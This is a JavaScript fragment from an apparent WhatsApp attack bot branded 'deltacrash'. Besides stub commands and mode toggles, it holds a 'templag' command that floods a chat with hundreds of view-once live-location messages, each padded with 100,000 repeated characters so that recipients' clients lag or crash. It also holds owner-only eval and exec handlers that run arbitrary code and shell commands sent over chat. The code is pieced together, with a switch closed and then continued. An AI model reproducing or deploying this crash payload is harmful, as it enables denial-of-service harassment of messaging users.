                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Tagging all members." });
                break;

            case `${prefix}toimg`:
                // Handle sticker to image logic
                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Converting sticker to image." });
                break;

            case `${prefix}tomp4`:
                // Handle sticker to video logic
                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Converting sticker to video." });
                break;

            case `${prefix}ping`:
                // Handle ping command
                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Pinging..." });
                break;

            case `${prefix}save`:
                // Handle saving status logic
                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Saving status..." });
                break;

            default:
                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Unknown command." });
                break;
        }
    }
});
case "public": {
    if (!isCreator) return deltacrashrevolutionReply(mess.owner);
    deltacrashgcinc.public = true;
    deltacrashrevolutionReply("*[Success]* *Public mode activated😊*");
    break;
}

case "self": {
    if (!isCreator) return deltacrashrevolutionReply(mess.owner);
    deltacrashgcinc.public = false;
    deltacrashrevolutionReply("*[Success]* *Private mode activated😊*");
    break;
}
break
case "premon": {
    if (!isCreator) return deltacrashrevolutionReply(mess.owner); // Only the creator can enable premium mode
    
    deltacrashgcinc.public = false; // Set the bot to private mode, meaning general users can't access it
    global.premiumMode = true; // Enable the premium-only mode globally
    
    deltacrashrevolutionReply("*[Success]* *Premium-only mode activated 😊*");
    break;
}

case "premoff": {
    if (!isCreator) return deltacrashrevolutionReply(mess.owner); // Only the creator can disable premium mode
    
    global.premiumMode = false; // Disable premium-only mode globally
    deltacrashgcinc.public = true; // Switch the bot back to public mode
    
    deltacrashrevolutionReply("*[Success]* *Premium-only mode deactivated, public mode enabled 😊*");
    break;
}
case 'band4band': {
darkphonk = fs.readFileSync('./menu.mp3')
    deltacrashgcinc.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case 'sommon': {
    let videoPath = './JapaneseGuys/sommon.mp4';
    let videoBuffer = fs.readFileSync(videoPath);
    deltacrashgcinc.sendMessage(m.chat, {video: videoBuffer, mimetype: 'video/mp4'}, {quoted: m});
}
break;
case "templag": {
    if (!isCreator) return deltacrashrevolutionReply(mess.owner);

    let startTime = Date.now(); // Capture the current time
    let jumlah = 500; // The maximum number of iterations (just in case it doesn't reach the time limit)

    for (let j = 0; j < jumlah; j++) {
        // Check if 5 seconds have passed
        if (Date.now() - startTime > 30000) break;

        var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    "liveLocationMessage": {
                        "degreesLatitude": (Math.random() * 180 - 90).toString(), // Random latitude
                        "degreesLongitude": (Math.random() * 360 - 180).toString(), // Random longitude
                        "caption": `࿆͆᷍THEDEMON꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰` + "ꦾ".repeat(100000) + "\n" + "DON'T MESS WITH ME".repeat(1000),
                        "sequenceNumber": "0",
                        "jpegThumbnail": ""
                    }
                }
            }
        }), { userJid: m.chat, quoted: aikamemek });

        await deltacrashgcinc.relayMessage(m.chat, etc.message, { participant: { jid: m.chat }, messageId: etc.key.id });
    }

    deltacrashrevolutionReply("`DON'T MESS WITH ME`\nsᴛᴀᴛᴜs: *sᴜᴄᴄᴇss*");
}
    break;
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return deltacrashrevolutionReply(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return deltacrashrevolutionReply(bang)
                    }
                    try {
                        deltacrashrevolutionReply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        deltacrashrevolutionReply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return deltacrashrevolutionReply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await deltacrashrevolutionReply(evaled)
                    } catch (err) {
                        await deltacrashrevolutionReply(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return deltacrashrevolutionReply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return deltacrashrevolutionReply(err)
                        if (stdout) return deltacrashrevolutionReply(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})